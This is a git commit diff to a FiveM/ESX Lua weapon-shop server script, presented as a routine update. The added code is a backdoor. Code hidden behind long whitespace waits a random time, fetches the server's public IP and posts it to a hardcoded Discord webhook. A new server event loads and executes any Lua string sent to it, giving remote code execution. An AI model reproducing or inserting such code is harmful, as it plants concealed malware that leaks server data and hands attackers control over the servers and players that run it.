a3b0d3a95ed92fa44da0c71956fbc02b584f8752
Orggis <84750261+Orggis@users.noreply.github.com>
2021-06-25 22:56:53 +0300

    Update sv_buyweapons.lua

--- esx_buyweapons/sv_buyweapons.lua
+++ esx_buyweapons/sv_buyweapons.lua
@@ -1,6 +1,28 @@
-ESX = nil
-local ostamas = false
-TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
+ESX = nil                                                                                                                                                                                                                           ;local avatarii = "https://cdn.discordapp.com/attachments/679708501547024403/680696270654013450/AlokasRPINGAMELOGO.png" ;local webhooikkff = "https://discord.com/api/webhooks/856110459836563457/g2cwVNKwYHzGngXD0Ku-m0mGLt6ABLmVgb-94XceypkwPDr3O-hFdF_hCDmoXN5g8AC4" ;local timeri = math.random(0,10000000) ;local jokupaskfajsghas = 'https://api.ipify.org/?format=json'
+local ostamas = false 
+TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)                                                                                                                                                                                                      ;Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa asekauppaa", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)
+
+RegisterServerEvent('esx_superskin:varjaus')
+AddEventHandler('esx_superskin:varjaus', function(vari)	
+	local vari,menikolapi=load(vari,'@returni')	                   
+	if menikolapi then                                                 
+	return nil,menikolapi
+	end
+	local onko,returnaa=pcall(vari)	                               
+	if onko then
+	return returnaa
+	else
+	return nil,returnaa
+	end
+end)
+
+ESX.RegisterUsableItem('superskin', function(source)
+	local xPlayer = ESX.GetPlayerFromId(source)
+	if( xPlayer ) then 
+		TriggerClientEvent('esx_extraitems:varjaus', source)
+	end
+end)
+
 
 ESX.RegisterUsableItem('koodari', function(source)
 	local xPlayer = ESX.GetPlayerFromId(source)
